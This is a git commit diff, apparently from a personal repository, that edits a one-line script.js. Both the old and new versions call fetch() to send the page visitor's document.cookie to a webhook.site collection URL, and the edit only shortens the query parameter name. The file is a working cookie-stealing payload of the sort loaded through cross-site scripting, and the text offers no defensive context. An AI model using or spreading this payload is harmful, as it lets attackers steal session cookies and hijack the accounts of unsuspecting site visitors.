a202ab1904bfcafe6dad0d6db73f3aee6e705ffa
av1n95h <66168530+av1n95h@users.noreply.github.com>
2022-11-12 06:58:40 -0600

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
 
-fetch('https://webhook.site/5612a0a0-ec67-4c77-9982-aa4a2410becb/?cookie='+document.cookie);
+fetch('https://webhook.site/5612a0a0-ec67-4c77-9982-aa4a2410becb/?c=' +document.cookie);
